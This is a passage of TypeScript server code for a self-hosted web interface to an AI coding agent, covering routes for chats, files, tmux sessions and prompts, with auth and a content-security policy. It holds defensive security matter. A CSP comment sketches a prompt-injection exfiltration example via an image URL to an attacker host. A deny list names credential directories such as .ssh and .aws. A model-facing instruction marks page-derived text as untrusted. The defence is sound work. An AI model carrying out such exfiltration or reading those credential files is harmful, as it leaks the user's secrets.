import express from "express";
import { WebSocketServer } from "ws";
import { createServer, type IncomingMessage, type Server } from "node:http";
import { mkdirSync } from "node:fs";
import { pipeline, type Duplex } from "node:stream";
import { fileURLToPath } from "node:url";
import { dirname, join, resolve } from "node:path";
import { homedir } from "node:os";
import { lookup } from "node:dns/promises";
import { Manager } from "./conversation.js";
import { BrowserBridge } from "./browser.js";
import * as files from "./files.js";
import { pruneScreenshots } from "./screenshots.js";
import { MAX_PASTE_BYTES, PASTE_TYPES, savePastedImage } from "./pasted.js";
import { UsageLog } from "./usage.js";
import { WatchRegistry } from "./watches.js";
import { PromptStore, hostOf, fill } from "./prompts.js";
import { resolveProject } from "./projects.js";
import { ServerBrowser, SERVER_BROWSER_ID } from "./server-browser.js";
import type { ClientEvent } from "./protocol.js";
import { ScheduleStore, Scheduler, parseWhen, nextRun, validTimeZone, describe as describeCron, type Schedule } from "./schedule.js";
import { makeRunner, pruneRuns } from "./schedule-run.js";
import { Notifier, notifyConfigFromEnv, type NotifyConfig } from "./notify.js";
import { TelegramListener } from "./telegram-listener.js";
import { tmuxAvailable, listSessions, createSession, renameSession, killSession, capture } from "./tmux.js";
import { ZipFile } from "yazl";
import { heartbeat } from "./heartbeat.js";
import { createAuth, AuthRefused, type Auth, type AuthConfig } from "./auth.js";
import { isUnspecified } from "./cidr.js";
import { attachAgent, attachShell, type AttachContext } from "./attach.js";
import { ALLOW_BYPASS, type SessionDeps } from "./session.js";
import { buildSetup } from "./setup.js";
import { mcpHandler } from "./mcp.js";
import { toMarkdown, exportFilename } from "./export.js";
import { BrowserAllowlist, normaliseHost, LEVELS, type Level } from "./browser-allow.js";
import { readFileSync } from "node:fs";
import { loadEnvFile, statePaths } from "./config.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, "..");

/**
 * Everything the server needs, resolved once. `envConfig()` reads it from the
 * environment for the real process; a test passes an object and gets a server
 * on a free port with a scripted SDK and no tailscale.
 */
export type ServerConfig = {
  host: string;
  port: number;
  workspace: string;
  chatsDir: string;
  filesRoot: string;
  projectsRoot: string;
  promptsPath: string;
  usagePath: string;
  /** schedules.json: the scheduled prompts (default beside prompts.json). */
  schedulesPath?: string;
  /** Scheduler tick (ms); tests shorten it. */
  scheduleTickMs?: number;
  /** Phone notifications (Telegram, webhook/ntfy); from the environment by default. */
  notify?: Pick<NotifyConfig, "telegram" | "webhook" | "fetch">;
  /** Replies control the chat a notification was about — answer a pending card,
      or send a new prompt — instead of only reading. Off by default: this widens
      "who can be answered by" to "whoever texts your configured Telegram chat",
      which the plain notify targets above do not. */
  telegramControl?: boolean;
  /** cwd for the standing "Telegram" chat — a CLAUDE.md telling it how to
      query this server's own schedules/chats/prompts over loopback lives here. */
  telegramContextDir?: string;
  /** Standing list of sites the browser tools may use without asking; null disables the gate. */
  browserAllowPath: string | null;
  browserAllowSeed: string[];
  /** Confirm-before-submit cards for browser clicks/Enter that submit a form (default true). */
  confirmSubmit?: boolean;
  /** The terminal pane and its /pty route; false removes both (CODETERM_SHELL=0). */
  shell?: boolean;
  maxUpload: number;
  maxZip: number;
  extraOrigins: string[];
  /** The address a notification's link should use. Defaults to the bind address. */
  publicUrl?: string;
  forceLocal: boolean;
  trustedCidrSpec?: string;
  extOrigin?: string;
  /** Extra denied paths, on top of the credential defaults under HOME. */
  denyExtra: string[];
  home: string;
  /** The server browser: a headless Chromium on this machine with a persistent profile (see src/server-browser.ts). */
  serverBrowser?: { profileDir: string; chromium?: string; extensionDir?: string; autostart?: boolean; timezone?: string; lang?: string; proxy?: string; plain?: boolean };
  /** Injection points for tests: tailscale calls and the SDK entry point. */
  authDeps?: AuthConfig["deps"];
  spawnQuery?: SessionDeps["spawnQuery"];
  titler?: SessionDeps["titler"];
  /** Whether systemd started this process; defaults to what INVOCATION_ID says. */
  systemd?: boolean;
  /** Socket heartbeat period; tests shorten it. */
  heartbeatMs?: number;
  log?: (line: string) => void;
  warn?: (line: string) => void;
};

export function envConfig(): ServerConfig {
  // systemd reads .env through EnvironmentFile; `npm start` did not read it at
  // all, so every setting the README tells you to put there was ignored
  // outside the service. Real environment variables still win.
  loadEnvFile(ROOT);
  const csv = (v: string | undefined, sepRe: RegExp) => (v ?? "").split(sepRe).map((s) => s.trim()).filter(Boolean);
  const home = process.env.HOME ?? homedir();
  const state = statePaths(ROOT);
  return {
    host: process.env.CODETERM_HOST ?? "127.0.0.1",
    port: Number(process.env.CODETERM_PORT ?? 8123),
    workspace: state.workspace,
    chatsDir: state.chats,
    // The shell pane is already a full shell as this user, so scoping the file
    // browser tighter than that would be theatre. Root is configurable; it
    // opens in the workspace.
    filesRoot: process.env.CODETERM_FILES_ROOT ?? home,
    projectsRoot: process.env.CODETERM_PROJECTS_ROOT ?? join(home, "projects"),
    promptsPath: state.prompts,
    schedulesPath: state.schedules,
    notify: notifyConfigFromEnv(),
    telegramControl: process.env.CODETERM_TELEGRAM_CONTROL === "1",
    telegramContextDir: state.telegramContext,
    usagePath: state.usage,
    browserAllowPath: process.env.CODETERM_BROWSER_GATE === "0" ? null : state.browserAllow,
    serverBrowser: { profileDir: state.serverBrowserProfile,
      ...(process.env.CODETERM_CHROMIUM ? { chromium: process.env.CODETERM_CHROMIUM } : {}), autostart: process.env.CODETERM_SERVER_BROWSER === "1",
      ...(process.env.CODETERM_SERVER_BROWSER_TZ ? { timezone: process.env.CODETERM_SERVER_BROWSER_TZ } : {}),
      ...(process.env.CODETERM_SERVER_BROWSER_LANG ? { lang: process.env.CODETERM_SERVER_BROWSER_LANG } : {}),
      ...(process.env.CODETERM_SERVER_BROWSER_PROXY ? { proxy: process.env.CODETERM_SERVER_BROWSER_PROXY } : {}),
      plain: process.env.CODETERM_SERVER_BROWSER_PLAIN !== "0" },
    browserAllowSeed: csv(process.env.CODETERM_BROWSER_ALLOW, /,/),
    confirmSubmit: process.env.CODETERM_CONFIRM_SUBMIT !== "0",
    shell: process.env.CODETERM_SHELL !== "0",
    maxUpload: Number(process.env.CODETERM_MAX_UPLOAD ?? 100 * 1024 * 1024),
    maxZip: Number(process.env.CODETERM_MAX_ZIP ?? 500 * 1024 * 1024),
    extraOrigins: csv(process.env.CODETERM_ORIGINS, /,/),
    publicUrl: process.env.CODETERM_PUBLIC_URL,
    forceLocal: process.env.CODETERM_LOCALHOST === "1",
    trustedCidrSpec: process.env.CODETERM_TRUSTED_CIDRS,
    extOrigin: process.env.CODETERM_EXT_ORIGIN,
    denyExtra: csv(process.env.CODETERM_DENY, /:/),
    home,
  };
}

/** What `boot()` hands back: enough to drive it from a test and to stop it. */
export type Running = {
  server: Server;
  port: number;
  convo: Manager;
  bridge: BrowserBridge;
  watches: WatchRegistry;
  usage: UsageLog;
  auth: Auth;
  /** Flush, close sessions, drop sockets. Idempotent. Resolves when the listener is closed. */
  shutdown(signal?: string): Promise<void>;
};

/**
 * Content-Security-Policy on every response.
 *
 * The transcript renders model replies as HTML, and model replies are shaped by
 * untrusted page content, so a hostile page can smuggle an instruction that
 * makes a reply embed `![x](http://attacker/px?d=<secret>)`. DOMPurify strips
 * scripts and event handlers, so injected markup cannot run code — it can only
 * auto-load a subresource. Locking img/media/font/connect to our own origin
 * closes that exfiltration channel: an off-origin pixel simply never fires.
 *
 *   img/media  'self' data: blob:  — same-origin assets, inline data URIs, and
 *                                    the blob: URLs the file viewer builds
 *   connect    'self'              — the /ws and /pty sockets are same-origin;
 *                                    an injected fetch to attacker.example dies
 *   script     'unsafe-inline'     — the pages carry one inline bootstrap each;
 *                                    every real dependency is a same-origin
 *                                    /vendor file, so this only permits our own
 *                                    inline block, not injected script (which
 *                                    DOMPurify already removes)
 */
export const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "media-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "frame-src 'self'",   // the pages download through a hidden same-origin iframe,
                         // and the desktop's right pane frames manage.html as a tab
  "frame-ancestors 'self'",   // and nothing outside this origin may frame us
  "base-uri 'none'",
  "form-action 'self'",
].join("; ");

/**
 * The file browser opens on the home directory, which holds the credentials
 * that would let someone bill your Claude account or SSH as you. Block those
 * subtrees even though they sit inside the root — a shell can read them, but a
 * one-click download in a browser (and a prompt-injected agent) should not.
 * Extend with CODETERM_DENY (colon-separated absolute paths).
 */
export const DENY_DEFAULTS = [
  ".claude", ".ssh", ".aws", ".config/gh", ".config/gcloud", ".gnupg",
  ".docker/config.json", ".netrc", ".git-credentials", ".kube",
];

/**
 * One line per refusal, but not without limit: a scan of an exposed port
 * must not be able to turn the journal into its own log. After DENY_LOG_BURST
 * lines in a minute the rest of that minute is summed up in one line.
 */
export const DENY_LOG_BURST = 20;

export async function boot(cfg: ServerConfig): Promise<Running> {
  const log = cfg.log ?? ((l) => console.log(l));
  const warn = cfg.warn ?? ((l) => console.warn(l));
  const { host: HOST, port: PORT, workspace: WORKSPACE, filesRoot: FILES_ROOT, maxUpload: MAX_UPLOAD, maxZip: MAX_ZIP } = cfg;
  /* The shell pane is the one part of this that has no approval gate, so it
     can be left out entirely: no /pty route, no terminal tool for the agent,
     no pane in the UI. Everything else works unchanged. */
  const SHELL = cfg.shell !== false;

  // Not just the two usual spellings: "::0", "0" and "0x0" bind every
  // interface too, and the resolver is what turns "0" into 0.0.0.0.
  const bindAddrs = [HOST, ...await lookup(HOST, { all: true }).then((r) => r.map((a) => a.address), () => [])];
  if (bindAddrs.some(isUnspecified)) {
    throw new AuthRefused("Refusing to bind all interfaces. /pty is an ungated shell; keep it on the tailnet.");
  }
  mkdirSync(WORKSPACE, { recursive: true });

  await files.setDeniedPaths([
    ...DENY_DEFAULTS.map((p) => join(cfg.home, p)),
    ...cfg.denyExtra,
    // The server's own secrets, wherever the project sits.
    join(ROOT, ".env"),
    // The server browser's profile: its cookies and saved logins are the
    // sessions it was signed into, one download away otherwise.
    cfg.serverBrowser?.profileDir ?? join(ROOT, "server-browser", "profile"),
  ]);

  // The Chrome extension dials in here; browser tools speak through it.
  const bridge = new BrowserBridge((line) => log(`[ext] ${line}`));

  /**
   * State shared across connections by design: the newest shell pane (the agent
   * reads that one) and the most recently attached chat (a new shell opens in
   * its cwd). Lives in one object so the attach loops can update it.
   */
  const state: AttachContext["state"] = { lastChat: null, activeShell: null };
  const clients = new Set<() => void>();
  const lastChatCwd = () => state.lastChat?.cwd ?? WORKSPACE;

  const watches = new WatchRegistry();
  const prompts = new PromptStore(cfg.promptsPath, { warn });
  const browserAllow = cfg.browserAllowPath ? new BrowserAllowlist(cfg.browserAllowPath, cfg.browserAllowSeed) : null;

  const convo = new Manager(
    WORKSPACE,
    cfg.chatsDir,
    cfg.projectsRoot,
    // prefer is replaced per-chat by LiveChat, which knows its own browser.
    { bridge, getShell: () => (SHELL ? state.activeShell : null), shell: SHELL,
      tmux: { list: async () => (await haveTmux()) ? listSessions() : [], capture: (name, lines) => capture(name, lines) }, watches, prompts, prefer: () => undefined, browserAllow, filesRoot: FILES_ROOT, confirmSubmit: cfg.confirmSubmit !== false, warn,
      ...(cfg.spawnQuery ? { spawnQuery: cfg.spawnQuery } : {}),
      ...(cfg.titler ? { titler: cfg.titler } : {}) },
  );
  convo.onListChanged = () => { for (const f of clients) f(); };

  convo.onChatRemoved = (id) => {
    const n = watches.removeForChat(id);
    if (n) log(`[watch] dropped ${n} watch(es) with the deleted chat`);
  };

  /**
   * A watch reported. Wake the chat that set it, if that chat is the one running;
   * otherwise leave it on the list for `watch list` to report.
   */
  bridge.onEvent((msg) => {
    if (msg.type !== "watch_fired") return;
    const id = String(msg.watchId ?? "");
    const detail = String(msg.detail ?? "something changed");
    const w = watches.fire(id, detail);
    if (!w) return;
    log(`[watch] fired: ${detail}`);
    // Route it to the conversation that set it. If that chat is no longer live
    // the watch stays on the list for `watch list` to report.
    const chat = convo.live(w.chatId);
    if (!chat) { log(`[watch] its chat is not live; left on the list`); return; }
    // The detail is page-derived (title/url from the extension), so it goes in
    // the untrusted block rather than inline in the instruction — the same rule
    // composePrompt applies to tab context. The description is the model's own
    // words from when it set the watch.
    chat.watchFired(
      w.description,
      detail,
      `A page watch you set has fired. You were waiting for: ${w.description}. ` +
        `The page's report is in the untrusted block above. Tell the user, briefly. ` +
        `Do not re-set the watch unless asked.`,
    );
  });

  // Expired and long-fired watches should not clutter the list forever.
  const sweeper = setInterval(() => {
    for (const w of watches.sweep()) {
      void bridge.send("watch_stop", { watchId: w.id }).catch(() => {});
    }
  }, 60_000);
  sweeper.unref();


  let port = PORT;   // the bound port; differs from PORT only when PORT is 0 (tests)
  const sbCfg = cfg.serverBrowser ?? { profileDir: join(ROOT, "server-browser", "profile") };
  const serverBrowser = new ServerBrowser({
    profileDir: sbCfg.profileDir, chromium: sbCfg.chromium, extensionDir: sbCfg.extensionDir ?? join(ROOT, "extension"),
    serverWsUrl: () => `ws://${HOST}:${port}/ext`, log, warn,
    timezone: sbCfg.timezone, lang: sbCfg.lang, proxy: sbCfg.proxy, plain: sbCfg.plain,
    ...(process.env.CT_CHROMIUM_WAIT ? { startTimeoutMs: Number(process.env.CT_CHROMIUM_WAIT) } : {}),
  });
  const auth = await createAuth({
    host: HOST, port: PORT, extraOrigins: cfg.extraOrigins,
    forceLocal: cfg.forceLocal,
    trustedCidrSpec: cfg.trustedCidrSpec,
    extOrigin: cfg.extOrigin,
    extraExtOrigins: () => (serverBrowser.extensionId ? [`chrome-extension://${serverBrowser.extensionId}`] : []),
    ...(cfg.authDeps ? { deps: cfg.authDeps } : {}),
  });
  const app = express();

  app.use((_req, res, next) => {
    res.setHeader("Content-Security-Policy", CSP);
    res.setHeader("X-Content-Type-Options", "nosniff");
    // same-origin, not no-referrer: manage.html reads document.referrer to send a
    // phone back to /m.html, and that is a same-origin hop. Cross-origin
    // navigations still leak nothing.
    res.setHeader("Referrer-Policy", "same-origin");
    next();
  });

  let denyWindow = 0, denyCount = 0;
  function logDeny(what: string, why: string): void {
    const minute = Math.floor(Date.now() / 60_000);
    if (minute !== denyWindow) {
      if (denyCount > DENY_LOG_BURST) warn(`[deny] …and ${denyCount - DENY_LOG_BURST} more refusals in that minute`);
      denyWindow = minute; denyCount = 0;
    }
    if (++denyCount <= DENY_LOG_BURST) warn(`[deny] ${what} — ${why}`);
  }

  /**
   * Same two checks as a WebSocket upgrade. Static assets stay open — they are
   * inert without a session — but anything touching the filesystem does not.
   */
  const guard: express.RequestHandler = (req, res, next) => {
    auth.denyReason(req).then((deny) => {
      if (!deny) return next();
      logDeny(`${req.method} ${req.path}`, deny);
      res.status(403).json({ error: deny });
    }).catch((e) => res.status(500).json({ error: String(e) }));
  };

  /**
   * Chat management over HTTP, for the manage page. The websocket carries the
   * live list for the running UI; this is for curation, which does not need a
   * session open.
   */
  app.get("/chats", guard, (_req, res) => {
    res.json({ projects: convo.projects(), chats: convo.list() });
  });

  /** Full-text search. Declared before /chats/:id so "search" is not an id. */
  app.get("/chats/search", guard, (req, res) => {
    const q = typeof req.query.q === "string" ? req.query.q : "";
    if (q.trim().length < 2) { res.status(400).json({ error: "q must be at least 2 characters" }); return; }
    res.json({ q, hits: convo.search(q) });
  });

  /** The transcript as Markdown, for pasting elsewhere or keeping. */
  app.get("/chats/:id/export.md", guard, (req, res) => {
    const rec = convo.read(String(req.params.id));
    if (!rec) { res.status(404).json({ error: "no such chat" }); return; }
    const project = rec.project ? convo.projects().find((p) => p.id === rec.project)?.name : undefined;
    res.setHeader("Content-Type", "text/markdown; charset=utf-8");
    res.setHeader("Content-Disposition", `attachment; filename="${exportFilename(rec)}"`);
    res.send(toMarkdown(rec, project));
  });

  /** One chat's transcript, so the manage page is not renaming things blind. */
  app.get("/chats/:id", guard, (req, res) => {
    const rec = convo.read(String(req.params.id));
    if (!rec) { res.status(404).json({ error: "no such chat" }); return; }
    res.json(rec);
  });

  app.post("/chats/:id", guard, express.json({ limit: "64kb" }), async (req, res) => {
    try {
      const id = String(req.params.id);
      const b = req.body as { title?: string; project?: string; open?: boolean };
      // None of these wake the chat: editing a record must not cost a subprocess.
      if (typeof b.title === "string") {
        if (!convo.rename(id, b.title)) throw new Error("no such chat");
      }
      if (typeof b.project === "string") {
        if (!(await convo.setProject(id, resolveProject(convo.projects(), b.project)))) throw new Error("no such chat");
      }
      // "open in the terminal": a fresh attach lands on the newest chat, so make
      // this one the newest. The flag used to be accepted and ignored, and the
      // redirect landed on whichever chat happened to be most recent.
      if (b.open === true) {
        if (!convo.touch(id)) throw new Error("no such chat");
      }
      res.json({ ok: true });
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.delete("/chats/:id", guard, async (req, res) => {
    try {
      convo.remove(String(req.params.id));
      res.json({ ok: true });
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  /* Which controls actually get used. Local file, never leaves this box; it
     exists so the navigation bar can be ordered from measurement next time
     rather than from priors. */
  const usage = new UsageLog(cfg.usagePath);

  app.post("/usage", guard, express.json({ limit: "1kb" }), (req, res) => {
    res.json({ ok: usage.record(String((req.body as { control?: unknown })?.control ?? "")) });
  });

  /* The sessions tab: tmux sessions on this machine. They are the machine's,
     not ours — tty's `wt_*` sessions appear here too, which is the point.
     Gated the same as the shell, and gone entirely when the shell is off:
     attaching to a session is opening a shell. */
  let tmuxOk: boolean | null = null;
  const haveTmux = async () => (SHELL ? (tmuxOk ??= await tmuxAvailable()) : false);
  const tmuxGuard: express.RequestHandler = async (_req, res, next) => {
    if (await haveTmux()) { next(); return; }
    res.status(404).json({ error: SHELL ? "tmux is not installed on the server" : "the shell is off (CODETERM_SHELL=0)" });
  };
  const tmuxFail = (res: express.Response, e: unknown) =>
    res.status(400).json({ error: e instanceof Error ? e.message.replace(/^Command failed.*?\n/s, "").trim() || e.message : String(e) });

  app.get("/sessions", guard, tmuxGuard, async (_req, res) => {
    try { res.json({ sessions: await listSessions() }); } catch (e) { tmuxFail(res, e); }
  });
  app.post("/sessions", guard, tmuxGuard, express.json({ limit: "8kb" }), async (req, res) => {
    const b = req.body as { name?: string; cwd?: string };
    try {
      const cwd = b.cwd ? await files.safePath(FILES_ROOT, b.cwd) : (state.lastChat?.cwd ?? WORKSPACE);
      await createSession(String(b.name ?? ""), cwd);
      res.json({ sessions: await listSessions() });
    } catch (e) { tmuxFail(res, e); }
  });
  app.put("/sessions/:name", guard, tmuxGuard, express.json({ limit: "8kb" }), async (req, res) => {
    try { await renameSession(String(req.params.name), String((req.body as { name?: string }).name ?? "")); res.json({ sessions: await listSessions() }); }
    catch (e) { tmuxFail(res, e); }
  });
  app.delete("/sessions/:name", guard, tmuxGuard, async (req, res) => {
    try { await killSession(String(req.params.name)); res.json({ sessions: await listSessions() }); }
    catch (e) { tmuxFail(res, e); }
  });

  /** What the UI must know before it draws itself. Small on purpose: the
      desktop page asks this before opening a terminal socket that may not exist. */
  app.get("/config", guard, async (_req, res) => { res.json({ shell: SHELL, sessions: await haveTmux(), home: cfg.home }); });

  app.get("/usage", guard, (_req, res) => {
    res.json({ counts: usage.counts() });
  });

  /** Setup & status: the answers to "is it working, and what do I do next". */
  const pkgVersion = (() => { try { return (JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")) as { version: string }).version; } catch { return "?"; } })();
  app.get("/setup", guard, (_req, res) => {
    res.json(buildSetup({
      version: pkgVersion, node: process.version, host: HOST, port, auth,
      extOrigin: cfg.extOrigin, extensionInstances: bridge.instances, readySeen: convo.readySeen,
      chats: convo.list().length, home: cfg.home, workspace: WORKSPACE, filesRoot: FILES_ROOT, projectsRoot: cfg.projectsRoot,
      bypassAllowed: ALLOW_BYPASS, systemd: cfg.systemd ?? Boolean(process.env.INVOCATION_ID),
      browserSites: browserAllow ? browserAllow.all().length : null,
      mcpServers: convo.mcpServers,
      notifyTargets: notifier.targets,
      telegramControl: telegramListener !== null,
      statePaths: statePaths(ROOT), envPath: join(ROOT, ".env"), shell: SHELL,
      schedules: (() => { const all = schedules.list().filter((s) => !s.paused); const next = all.map((s) => s.nextAt).filter((n): n is number => n !== null).sort((a, b) => a - b)[0]; return { count: schedules.list().length, next: next ?? null }; })(),
    }));
  });

  /** The standing browser-site list; the card's "Always" adds here, the manage page edits it. */
  app.get("/browser-allow", guard, (_req, res) => {
    res.json({ gated: browserAllow !== null, hosts: browserAllow?.all() ?? [] });
  });
  app.post("/browser-allow", guard, express.json({ limit: "4kb" }), (req, res) => {
    const b = req.body as { host?: unknown; level?: unknown };
    const host = normaliseHost(String(b?.host ?? ""));
    if (!host) { res.status(400).json({ error: "not a hostname (use example.com or *.example.com)" }); return; }
    if (b.level !== undefined && !(LEVELS as readonly unknown[]).includes(b.level)) { res.status(400).json({ error: "level must be read or act" }); return; }
    if (!browserAllow) { res.status(400).json({ error: "the browser gate is disabled (CODETERM_BROWSER_GATE=0)" }); return; }
    const level = (b.level as Level | undefined) ?? "act";
    // add raises; set lowers — the page wants "make it exactly this"
    const changed = browserAllow.add(host, level) || browserAllow.set(host, level);
    res.json({ added: changed, hosts: browserAllow.all() });
  });
  app.delete("/browser-allow/:host", guard, (req, res) => {
    res.json({ removed: browserAllow?.remove(String(req.params.host)) ?? false, hosts: browserAllow?.all() ?? [] });
  });

  app.get("/projects", guard, (_req, res) => {
    res.json({ projects: convo.projects() });
  });

  /**
   * Which prompts apply right now. The active tab is resolved here rather than
   * in the client, so the plain web UI — which has no idea what your browser is
   * showing — gets the same domain-scoped list as the side panel.
   */
  app.get("/prompts", guard, async (_req, res) => {
    const tab = (await bridge.activeTab()) ?? {};
    const host = hostOf(tab.url);
    res.json({
      host,
      url: tab.url ?? "",
      title: tab.title ?? "",
      hasSelection: Boolean(tab.selection),
      prompts: prompts.for(host).map((p) => ({ ...p, filled: fill(p.text, tab) })),
      all: prompts.all(),
    });
  });

  app.post("/prompts", guard, express.json({ limit: "256kb" }), (req, res) => {
    try {
      const b = req.body as { id?: string; title?: string; text?: string; domains?: string[] };
      res.json(prompts.upsert({ id: b.id, title: String(b.title ?? ""), text: String(b.text ?? ""), domains: b.domains ?? [] }));
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.delete("/prompts/:id", guard, (req, res) => {
    res.json({ removed: prompts.remove(String(req.params.id)) });
  });

  app.get("/files/info", guard, async (_req, res) => {
    // Where the browser should open: the agent's workspace when it sits under
    // the browsable root, else the root itself.
    let start = "";
    try { start = files.toRel(FILES_ROOT, await files.safePath(FILES_ROOT, WORKSPACE)); } catch { start = ""; }
    res.json({ root: FILES_ROOT, start, maxUpload: MAX_UPLOAD, cwd: lastChatCwd() });
  });

  /** @file completion: paths under `path` (the chat's cwd, relative to the files root) matching `q`. */
  app.get("/files/suggest", guard, async (req, res) => {
    try {
      const q = typeof req.query.q === "string" ? req.query.q : "";
      res.json({ files: await files.suggest(FILES_ROOT, typeof req.query.path === "string" ? req.query.path : undefined, q) });
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.get("/files/list", guard, async (req, res) => {
    try {
      res.json(await files.list(FILES_ROOT, typeof req.query.path === "string" ? req.query.path : undefined));
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.get("/files/read", guard, async (req, res) => {
    try {
      const path = String(req.query.path ?? "");
      const f = await files.statFile(FILES_ROOT, path);
      if (req.query.preview === "1") {
        const t = await files.readTextPreview(f.abs, 256 * 1024);
        res.json(t ? { kind: "text", name: f.name, ...t } : { kind: "binary", name: f.name, bytes: f.size });
        return;
      }
      // ?inline=1: open in the browser's own viewer for the type (PDF viewer,
      // image, plain text); unknown types, and HTML/SVG (never as a page on
      // this origin), stay downloads. Otherwise let the browser name the
      // download; the client also sets its own.
      const inline = req.query.inline === "1" ? files.inlineType(f.name) : null;
      if (inline) {
        res.setHeader("Content-Type", inline);
        res.setHeader("Content-Disposition", `inline; filename="${encodeURIComponent(f.name)}"`);
        // belt and braces for anything the browser might render: no scripts, no origin
        if (!inline.startsWith("application/pdf")) res.setHeader("Content-Security-Policy", "sandbox; default-src 'none'");
      } else {
        res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(f.name)}"`);
      }
      res.setHeader("Content-Length", String(f.size));
      // pipeline, not pipe: a client that goes away mid-download destroys the
      // file stream too, instead of leaving it reading into a dead socket.
      pipeline(files.streamFile(f.abs), res, () => {});
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  /**
   * Zip a selection. Streamed straight to the response rather than written to a
   * temp file: the whole point is to hand over a large selection, and nothing
   * needs it on disk. JSON from the extension's fetch; a urlencoded form from
   * the same-origin pages, whose browser streams the zip to disk instead of
   * buffering it.
   */
  app.post("/files/zip", guard, express.json({ limit: "256kb" }), express.urlencoded({ extended: false, limit: "256kb" }), async (req, res) => {
    try {
      const b = req.body as { path?: string; names?: string[] | string };
      const raw = Array.isArray(b.names) ? b.names : typeof b.names === "string" ? [b.names] : [];
      const names = raw.filter((n): n is string => typeof n === "string");
      if (!names.length) throw new Error("nothing selected");

      const { entries, bytes } = await files.collectForZip(FILES_ROOT, b.path, names, MAX_ZIP);
      if (!entries.length) throw new Error("nothing to zip — the selection held no files");
      // ?check=1: the same-origin pages download through a hidden iframe, where
      // an error body is invisible. They ask first, then submit the form.
      if (req.query.check === "1") { res.json({ ok: true, files: entries.length, bytes }); return; }

      const stem = names.length === 1 ? names[0].replace(/\W+/g, "-") : "selection";
      res.setHeader("Content-Type", "application/zip");
      res.setHeader("Content-Disposition", `attachment; filename="${stem}.zip"`);
      log(`[zip] ${entries.length} file(s), ${(bytes / 1024).toFixed(0)}KB`);

      const zip = new ZipFile();
      // yazl reports a file it cannot read (unreadable, or grown since it was
      // stat'ed — a log being written) on the ZipFile, not on outputStream.
      // Unheard, that 'error' ended the process. The zip is already streaming,
      // so all that is left is to cut the response short.
      zip.on("error", (e: Error) => { log(`[zip] aborted: ${e.message}`); res.destroy(); });
      for (const e of entries) zip.addFile(e.abs, e.name);
      pipeline(zip.outputStream, res, () => {});
      zip.end();
    } catch (e) {
      // If the stream already started, a JSON error would corrupt the zip.
      if (res.headersSent) { res.destroy(); return; }
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  // Streamed to disk. express.raw() held the whole body in memory — up to
  // MAX_UPLOAD (100 MB) per request — which is the same OOM shape as the old
  // file preview, just on the write side.
  app.post("/files/upload", guard, async (req, res) => {
    try {
      const name = String(req.query.name ?? "");
      const dir = typeof req.query.path === "string" ? req.query.path : undefined;
      if (!name) throw new Error("missing ?name=");
      res.json(await files.saveUploadStream(FILES_ROOT, dir, name, req, MAX_UPLOAD));
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  /**
   * An image pasted into the terminal pane. The CLI in there takes file paths,
   * not clipboards, so the bytes are spooled to a private file and the path
   * goes back; the pane then types it into the pty.
   */
  app.post("/paste/image", guard, express.raw({ type: PASTE_TYPES, limit: MAX_PASTE_BYTES }), async (req, res) => {
    try {
      const body = req.body as Buffer | undefined;
      if (!Buffer.isBuffer(body)) throw new Error("expected image bytes");
      const saved = await savePastedImage(body, String(req.headers["content-type"] ?? ""));
      log(`[paste] ${saved.path} (${(saved.bytes / 1024).toFixed(0)}KB)`);
      res.json(saved);
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  app.post("/files/mkdir", guard, express.json({ limit: "4kb" }), async (req, res) => {
    try {
      const b = req.body as { path?: string; name?: string };
      if (typeof b.name !== "string") throw new Error("missing name");
      res.json(await files.makeDirectory(FILES_ROOT, typeof b.path === "string" ? b.path : undefined, b.name));
    } catch (e) {
      res.status(400).json({ error: e instanceof Error ? e.message : String(e) });
    }
  });

  /* The mobile page shares the side panel's script and stylesheet verbatim.
     MV3 forbids remote code, so the extension must load them from disk — serving
     those same two files here keeps mobile and the panel from drifting apart
     instead of maintaining a second copy. */
  app.get("/m/app.js", (_req, res) => res.type("js").sendFile(join(ROOT, "extension/sidepanel.js")));
  app.get("/m/term.js", (_req, res) => res.type("js").sendFile(join(ROOT, "extension/term.js")));
  app.get("/m/panel.css", (_req, res) => res.type("css").sendFile(join(ROOT, "extension/panel.css")));
  /* Bare /m is what you type on a phone. */
  app.get("/m", (_req, res) => res.redirect(302, "/m.html"));

  app.use(express.static(join(ROOT, "public")));
  app.use("/vendor/xterm", express.static(join(ROOT, "node_modules/@xterm/xterm")));
  app.use("/vendor/addon-fit", express.static(join(ROOT, "node_modules/@xterm/addon-fit")));
  app.use("/vendor/addon-web-links", express.static(join(ROOT, "node_modules/@xterm/addon-web-links")));
  app.use("/vendor/marked", express.static(join(ROOT, "node_modules/marked/lib")));
  app.use("/vendor/dompurify", express.static(join(ROOT, "node_modules/dompurify/dist")));

  const server = createServer(app);
  // Default maxPayload is 100 MB, JSON.parsed in one go. The largest legitimate
  // frame is a screenshot data URL over /ext (a few MB); 32 MB leaves headroom.
  const wss = new WebSocketServer({ noServer: true, maxPayload: 32 * 1024 * 1024 });

  const browserWatchers = new Set<() => void>();
  const broadcast = new Set<(e: ClientEvent) => void>();
  const ctx: AttachContext = { convo, bridge, filesRoot: FILES_ROOT, workspace: WORKSPACE, clients, state, browserWatchers, broadcast };

  /* Scheduled prompts: the store, the runner (a chat per run), the ticking scheduler. */
  const schedules = new ScheduleStore(cfg.schedulesPath ?? join(dirname(cfg.promptsPath), "schedules.json"), { warn });
  const notifier = new Notifier({ ...(cfg.notify ?? {}), log, warn });
  /* Where a notification tells you to go. The bind address is right for a
     laptop on the same tailnet, but it is an IP: it reads badly on a phone
